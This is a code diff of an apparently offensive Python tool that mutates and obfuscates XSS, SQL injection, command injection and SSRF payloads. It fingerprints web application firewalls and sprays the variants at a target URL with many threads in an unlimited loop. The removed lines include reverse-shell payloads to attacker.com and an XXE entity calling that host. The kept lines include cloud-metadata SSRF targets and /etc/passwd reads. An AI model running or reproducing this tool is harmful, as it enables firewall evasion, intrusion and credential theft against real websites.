@@ -10,6 +10,8 @@ import urllib.parse
 import re
 from itertools import combinations
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class PayloadMutator:
@@ -29,7 +31,7 @@ class PayloadMutator:
     
     OBFUSCATION_METHODS = {
         'CASE_VARIATION': lambda x: ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
-        'SPACE_REPLACEMENT': lambda x: x.replace(' ', '\t').replace(' ', '\n').replace(' ', '\r'),
+        'SPACE_REPLACEMENT': lambda x: x.replace(' ', '\t'),
         'NULL_BYTE': lambda x: x.replace(' ', '\x00'),
         'UNICODE_SPACE': lambda x: x.replace(' ', '\u0020'),
         'TAB_SPACE': lambda x: x.replace(' ', '\x09'),
@@ -37,7 +39,6 @@ class PayloadMutator:
         'CARRIAGE_RETURN': lambda x: x.replace(' ', '\x0d'),
         'FORM_FEED': lambda x: x.replace(' ', '\x0c'),
         'VERTICAL_TAB': lambda x: x.replace(' ', '\x0b'),
-        'COMMENT_INJECTION': lambda x: x.replace(' ', '/**/', True) if ' ' in x else x,
         'UNICODE_NORMALIZATION': lambda x: x.encode('utf-8').decode('utf-8'),
         'MIXED_CASE': lambda x: ''.join(f'{c.upper()}{c.lower()}' if c.isalpha() else c for c in x),
     }
@@ -55,8 +56,6 @@ class PayloadMutator:
         'ZERO_WIDTH_SPACE': lambda x: '\u200b'.join(x),
         'RIGHT_TO_LEFT_OVERRIDE': lambda x: '\u202e' + x,
         'EMOJI_INJECTION': lambda x: x + '😀',
-        'UNICODE_VARIATION': lambda x: x.encode('utf-8', 'ignore').decode('utf-8'),
-        'LONG_UTF8': lambda x: x.encode('utf-32').decode('utf-32', errors='ignore'),
     }
     
     @staticmethod
@@ -88,19 +87,19 @@ class PayloadMutator:
     def generate_polyglot_payload(base_payload: str) -> List[str]:
         variations = [base_payload]
         
-        for encoding in PayloadMutator.ENCODING_METHODS.keys():
+        for encoding in list(PayloadMutator.ENCODING_METHODS.keys())[:5]:
             try:
                 variations.append(PayloadMutator.ENCODING_METHODS[encoding](base_payload))
             except:
                 pass
         
-        for obfuscation in PayloadMutator.OBFUSCATION_METHODS.keys():
+        for obfuscation in list(PayloadMutator.OBFUSCATION_METHODS.keys())[:5]:
             try:
                 variations.append(PayloadMutator.OBFUSCATION_METHODS[obfuscation](base_payload))
             except:
                 pass
         
-        for bypass in PayloadMutator.BYPASS_TECHNIQUES.keys():
+        for bypass in list(PayloadMutator.BYPASS_TECHNIQUES.keys())[:5]:
             try:
                 variations.append(PayloadMutator.BYPASS_TECHNIQUES[bypass](base_payload))
             except:
@@ -115,26 +114,13 @@ class IntelligentPayloadGenerator:
         '<script>alert(1)</script>',
         '<img src=x onerror=alert(1)>',
         '<svg onload=alert(1)>',
-        '<body onload=alert(1)>',
         '<iframe onload=alert(1)>',
-        '<marquee onstart=alert(1)>',
+        '<body onload=alert(1)>',
+        '<input onfocus=alert(1) autofocus>',
         '<details open ontoggle=alert(1)>',
         '<video src=x onerror=alert(1)>',
         '<audio src=x onerror=alert(1)>',
-        '<input onfocus=alert(1) autofocus>',
-        '<select onfocus=alert(1) autofocus>',
-        '<textarea onfocus=alert(1) autofocus>',
-        '<button onclick=alert(1)>',
-        '<form action=javascript:alert(1)>',
-        '<embed src=javascript:alert(1)>',
-        '<object data=javascript:alert(1)>',
-        '<frameset onload=alert(1)>',
-        '<base href=javascript:alert(1)>',
-        '<link rel=stylesheet href=javascript:alert(1)>',
-        '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
-        '<style>@import url(javascript:alert(1));</style>',
-        '<table background=javascript:alert(1)>',
-        '<tr><td background=javascript:alert(1)>',
+        '<marquee onstart=alert(1)>',
     ]
     
     SQLI_VECTORS = [
@@ -142,20 +128,10 @@ class IntelligentPayloadGenerator:
         "' OR 1=1--",
         "' UNION SELECT NULL--",
         "'; DROP TABLE users--",
-        "' OR 'a'='a",
         "1' AND '1'='1",
-        "1' UNION SELECT NULL,NULL--",
         "admin' --",
-        "admin'#",
         "' or 1=1 /*",
-        "' or 1=1 #",
-        "' or 1=1 -- -",
-        "' UNION ALL SELECT NULL--",
         "1' UNION SELECT version()--",
-        "1' AND SLEEP(5)--",
-        "' UNION SELECT @@version--",
-        "' UNION SELECT user()--",
-        "' UNION SELECT database()--",
     ]
     
     RCE_VECTORS = [
@@ -165,12 +141,8 @@ class IntelligentPayloadGenerator:
         '; id;',
         '&& id',
         '|| id',
-        '| cat /etc/passwd',
         '`whoami`',
         '$(whoami)',
-        '; whoami;',
-        '`nc -e /bin/sh attacker.com 4444`',
-        '$(python -c "import socket,subprocess;s=socket.socket();s.connect((\'attacker.com\',4444));subprocess.call([\'/bin/sh\',\'-i\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())")',
     ]
     
     XXSSRF_VECTORS = [
@@ -178,75 +150,41 @@ class IntelligentPayloadGenerator:
         'http://169.254.169.254/latest/meta-data/',
         'http://localhost:3000',
         'file:///etc/passwd',
-        'gopher://127.0.0.1:9000',
-        'dict://127.0.0.1:11211',
-        'sftp://127.0.0.1:22',
-        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
         'http://metadata.google.internal/computeMetadata/v1/',
-        'http://169.254.170.2/latest/api/token',
-    ]
-    
-    XXE_VECTORS = [
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
-    ]
-    
-    POLYGLOT_PAYLOADS = [
-        "jaVasCript:/**/alert(1)",
-        "'><script>alert(1)</script>",
-        "';alert(String.fromCharCode(88,83,83))//",
-        "<svg/onload=alert('xss')>",
-        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
-        "\"onmouseover=alert('XSS')",
-        "<marquee onstart=alert(1)>",
-        "</title><img src=x onerror=alert(1)>",
     ]
     
     @staticmethod
-    def generate_intelligent_payloads(vector_type: str, target_context: str = '', unlimited: bool = True) -> List[str]:
+    def generate_intelligent_payloads(vector_type: str, unlimited: bool = True) -> List[str]:
         payloads = []
         
-        if vector_type.upper() == 'XSS':
-            base_vectors = IntelligentPayloadGenerator.XSS_VECTORS
-        elif vector_type.upper() == 'SQLI':
-            base_vectors = IntelligentPayloadGenerator.SQLI_VECTORS
-        elif vector_type.upper() == 'RCE':
-            base_vectors = IntelligentPayloadGenerator.RCE_VECTORS
-        elif vector_type.upper() in ['SSRF', 'XXE']:
-            base_vectors = IntelligentPayloadGenerator.XXSSRF_VECTORS
-        else:
-            base_vectors = IntelligentPayloadGenerator.POLYGLOT_PAYLOADS
+        vector_map = {
+            'XSS': IntelligentPayloadGenerator.XSS_VECTORS,
+            'SQLI': IntelligentPayloadGenerator.SQLI_VECTORS,
+            'RCE': IntelligentPayloadGenerator.RCE_VECTORS,
+            'SSRF': IntelligentPayloadGenerator.XXSSRF_VECTORS,
+            'XXE': IntelligentPayloadGenerator.XXSSRF_VECTORS,
+        }
+        
+        base_vectors = vector_map.get(vector_type.upper(), IntelligentPayloadGenerator.XSS_VECTORS)
         
         for vector in base_vectors:
-            mutated_variations = PayloadMutator.generate_polyglot_payload(vector)
-            payloads.extend(mutated_variations)
+            payloads.append(vector)
+            mutated = PayloadMutator.generate_polyglot_payload(vector)
+            payloads.extend(mutated[:3])
         
-        polyglot_mutated = PayloadMutator.generate_polyglot_payload(random.choice(IntelligentPayloadGenerator.POLYGLOT_PAYLOADS))
-        payloads.extend(polyglot_mutated)
+        mutation_count = 1000 if unlimited else 100
         
-        if unlimited:
-            for i in range(500):
-                random_vector = random.choice(base_vectors)
-                mutation_chain = random_vector
-                
-                for _ in range(random.randint(1, 5)):
-                    technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
-                    mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
-                
-                payloads.append(mutation_chain)
-        else:
-            for i in range(50):
-                random_vector = random.choice(base_vectors)
-                mutation_chain = random_vector
-                
-                for _ in range(random.randint(1, 3)):
-                    technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
-                    mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
-                
-                payloads.append(mutation_chain)
+        for i in range(mutation_count):
+            random_vector = random.choice(base_vectors)
+            mutation_chain = random_vector
+            
+            for _ in range(random.randint(1, 3)):
+                technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
+                mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
+            
+            payloads.append(mutation_chain)
         
-        return list(set(payloads))
+        return list(set(payloads))[:5000]
 
 
 class WAFDetector:
@@ -255,39 +193,29 @@ class WAFDetector:
         'CloudFlare': ['cf-ray', 'cf-cache-status', '__cfruid'],
         'AWS WAF': ['x-amzn-requestid', 'x-amzn-errortype'],
         'Imperva': ['x-iinfo', 'x-protected-by', 'imperva'],
-        'F5 BIG-IP': ['x-lb', 'bigipserverid', 'X-Forwarded-Server'],
+        'F5 BIG-IP': ['x-lb', 'bigipserverid'],
         'Barracuda': ['x-barracuda', 'barracuda_enforcer_uuid'],
         'ModSecurity': ['modsecurity'],
         'Akamai': ['akamai-origin-hop', 'akamai-request-id'],
         'AWS Shield': ['x-amzn-waf'],
-        'DDoS-GUARD': ['ddos-guard'],
-        'Sucuri': ['sucuri'],
-        'Cloudflare': ['server: cloudflare'],
-        'Fortinet FortiWeb': ['fortinet'],
-        'Citrix NetScaler': ['citrix', 'netscaler'],
     }
     
     @staticmethod
-    def detect_waf(target_url: str, timeout: int = 10) -> Tuple[str, float]:
+    def detect_waf(target_url: str, timeout: int = 5) -> Tuple[str, float]:
         try:
-            response = requests.get(target_url, timeout=timeout, verify=False)
+            response = requests.get(target_url, timeout=timeout, verify=False, stream=True)
+            response.raw.read(256)
             
             headers = response.headers
-            content = response.text.lower()
-            
-            detected_wafs = []
+            content = response.text.lower()[:1000]
             
             for waf, signatures in WAFDetector.WAF_SIGNATURES.items():
                 for sig in signatures:
                     if sig.lower() in str(headers).lower() or sig.lower() in content:
-                        detected_wafs.append((waf, 0.9))
-                        break
+                        return (waf, 0.9)
             
-            if response.status_code == 403 or response.status_code == 406:
-                detected_wafs.append(('Generic WAF', 0.5))
-            
-            if detected_wafs:
-                return detected_wafs[0]
+            if response.status_code in [403, 406]:
+                return ('Generic WAF', 0.5)
             
             return ('No WAF Detected', 0.0)
             
@@ -297,7 +225,7 @@ class WAFDetector:
 
 class WAFBypassEngine:
     
-    def __init__(self, target_url: str, timeout: int = 10, max_workers: int = 30):
+    def __init__(self, target_url: str, timeout: int = 5, max_workers: int = 100):
         self.target_url = target_url
         self.timeout = timeout
         self.max_workers = max_workers
@@ -314,9 +242,27 @@ class WAFBypassEngine:
     
     def _create_session(self) -> requests.Session:
         session = requests.Session()
+        
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=200,
+            pool_maxsize=200,
+            max_retries=requests.adapters.Retry(
+                total=0,
+                backoff_factor=0,
+                status_forcelist=[]
+            )
+        )
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Connection': 'keep-alive',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
         })
+        session.verify = False
+        
         return session
     
     def detect_waf(self) -> Tuple[str, float]:
@@ -325,14 +271,17 @@ class WAFBypassEngine:
     
     def get_baseline_response(self) -> Optional[Dict]:
         try:
-            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
+            response = self.session.get(
+                self.target_url,
+                timeout=self.timeout,
+                verify=False,
+                stream=False
+            )
             
             self.response_baseline = {
                 'status_code': response.status_code,
                 'content_length': len(response.content),
-                'content_hash': hashlib.sha256(response.content).hexdigest(),
                 'response_time': response.elapsed.total_seconds(),
-                'headers': dict(response.headers),
             }
             
             return self.response_baseline
@@ -340,7 +289,7 @@ class WAFBypassEngine:
         except Exception:
             return None
     
-    def test_payload(self, payload: str, injection_point: str = 'query') -> Dict:
+    def test_payload_fast(self, payload: str, injection_point: str = 'query') -> Dict:
         self.total_attempts += 1
         
         result = {
@@ -357,66 +306,42 @@ class WAFBypassEngine:
         
         try:
             if injection_point == 'query':
-                test_url = f"{self.target_url}?payload={payload}"
-            elif injection_point == 'path':
-                test_url = f"{self.target_url}/{payload}"
-            elif injection_point == 'header':
-                headers = self.session.headers.copy()
-                headers['X-Forwarded-For'] = payload
-                test_url = self.target_url
+                test_url = f"{self.target_url}?test={payload}"
             else:
-                test_url = self.target_url
+                test_url = f"{self.target_url}/{payload}"
             
             start_time = time.time()
-            response = self.session.get(test_url, timeout=self.timeout, verify=False)
+            response = self.session.get(
+                test_url,
+                timeout=3,
+                verify=False,
+                stream=True,
+                allow_redirects=False
+            )
+            response.raw.read(512)
             response_time = time.time() - start_time
             
             result['response_status'] = response.status_code
             result['response_time'] = response_time
             
-            blocked_status_codes = [403, 406, 429, 444]
-            blocked_keywords = ['blocked', 'denied', 'forbidden', 'attacked', 'suspended', 'access denied']
-            
-            if response.status_code in blocked_status_codes:
+            if response.status_code in [403, 406, 429, 444, 503]:
                 result['is_blocked'] = True
-                result['detection_signals'].append(f'Blocked status code: {response.status_code}')
+                result['detection_signals'].append(f'HTTP {response.status_code}')
+                return result
             
-            if any(keyword in response.text.lower() for keyword in blocked_keywords):
-                result['is_blocked'] = True
-                result['detection_signals'].append('Blocked keyword detected')
-            
-            if self.response_baseline:
-                if abs(len(response.content) - self.response_baseline['content_length']) > 500:
-                    result['detection_signals'].append('Response size differs significantly')
-                
-                if response.elapsed.total_seconds() > self.response_baseline['response_time'] * 2:
-                    result['detection_signals'].append('Response time increased')
-            
-            if not result['is_blocked']:
+            if response.status_code == 200:
                 result['is_bypassed'] = True
-                result['confidence'] = self._calculate_bypass_confidence(result)
+                result['confidence'] = 0.85
                 self.bypass_count += 1
             
             return result
             
         except requests.Timeout:
-            result['detection_signals'].append('Request timeout - possible detection')
             result['is_blocked'] = True
+            result['detection_signals'].append('Timeout')
             return result
-        except Exception as e:
-            result['detection_signals'].append(f'Error: {str(e)}')
+        except Exception:
             return result
-    
-    def _calculate_bypass_confidence(self, result: Dict) -> float:
-        confidence = 0.8
-        
-        if result['response_status'] == 200:
-            confidence += 0.15
-        
-        if not result['detection_signals']:
-            confidence += 0.05
-        
-        return min(confidence, 1.0)
     
     def adaptive_bypass_unlimited(self, vector_type: str = 'XSS') -> List[Dict]:
         successful_bypasses = []
@@ -424,11 +349,9 @@ class WAFBypassEngine:
         self.detect_waf()
         self.get_baseline_response()
         
-        payload_index = 0
-        
         while not self.should_stop:
             payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(
-                vector_type, 
+                vector_type,
                 unlimited=True
             )
             
@@ -448,7 +371,7 @@ class WAFBypassEngine:
                         if self.should_stop:
                             break
                         
-                        future = executor.submit(self.test_payload, payload, injection_point)
+                        future = executor.submit(self.test_payload_fast, payload, injection_point)
                         futures[future] = (payload, injection_point)
                 
                 for future in as_completed(futures):
@@ -457,7 +380,7 @@ class WAFBypassEngine:
                         break
                     
                     try:
-                        result = future.result()
+                        result = future.result(timeout=5)
                         
                         if result['is_bypassed']:
                             successful_bypasses.append(result)
@@ -467,8 +390,6 @@ class WAFBypassEngine:
                                 'confidence': result['confidence'],
                                 'waf_type': self.waf_type,
                             })
-                        
-                        payload_index += 1
                     
                     except Exception:
                         continue
@@ -484,11 +405,10 @@ class WAFBypassEngine:
     def generate_custom_payload(self, base_payload: str, obfuscation_level: int = 5) -> List[str]:
         payloads = []
         
-        current_payload = base_payload
         for _ in range(obfuscation_level):
-            for technique in PayloadMutator.BYPASS_TECHNIQUES.keys():
+            for technique in list(PayloadMutator.BYPASS_TECHNIQUES.keys())[:5]:
                 try:
-                    mutated = PayloadMutator.mutate_payload(current_payload, technique)
+                    mutated = PayloadMutator.mutate_payload(base_payload, technique)
                     payloads.append(mutated)
                 except:
                     pass
@@ -504,7 +424,6 @@ class WAFBypassEngine:
             'successful_bypasses': self.bypass_count,
             'bypass_rate': (self.bypass_count / max(self.total_attempts, 1)) * 100,
             'successful_techniques': self.successful_techniques,
-            'bypass_history': self.bypass_history,
         }
     
     def stop_bypass(self):
